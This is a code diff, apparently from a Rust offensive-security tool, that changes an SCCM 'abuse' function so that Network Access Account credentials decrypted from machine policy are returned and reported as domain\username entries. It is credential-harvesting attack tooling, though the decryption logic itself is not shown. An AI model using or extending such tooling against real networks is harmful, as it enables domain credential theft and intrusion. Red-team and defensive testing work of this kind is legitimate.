@@ -327,7 +327,7 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
         .clone()
         .unwrap_or_else(|| site.site_code.clone());
 
-    let body = scanner.request_machine_policy(&site_code).await?;
+    let (body, credentials) = scanner.request_machine_policy(&site_code).await?;
 
     if body.is_none() {
         warn!("[SCCM/abuse] Machine policy request returned no data");
@@ -341,20 +341,31 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
         });
     }
 
-    info!("[SCCM/abuse] Machine Policy received — checking for NAA credentials...");
+    info!(
+        "[SCCM/abuse] Machine Policy received — {} NAA credential(s) extracted",
+        credentials.len()
+    );
 
-    // The NAA decryption is performed inside request_machine_policy itself.
-    // TODO: refactor SccmScanner to surface extracted NaaCredential objects.
+    let notes = if credentials.is_empty() {
+        vec![
+            "Machine policy received — no decryptable NAA credentials found.".to_string(),
+            "This may indicate NAA is not configured or credentials are stored differently."
+                .to_string(),
+        ]
+    } else {
+        credentials
+            .iter()
+            .map(|c| format!("NAA: {}\\{}", c.domain, c.username))
+            .collect()
+    };
+
     Ok(SccmAbuseResult {
         technique: SccmTechnique::NaaCredentialExtraction,
-        success: true,
+        success: !credentials.is_empty(),
         affected_targets: vec![config.target.clone()],
-        credentials: Vec::new(), // populated by caller after inspecting scanner output
+        credentials,
         command_output: body,
-        notes: vec![
-            "Machine policy received and parsed — check scanner logs for decrypted NAA credentials."
-                .to_string(),
-        ],
+        notes,
     })
 }
 
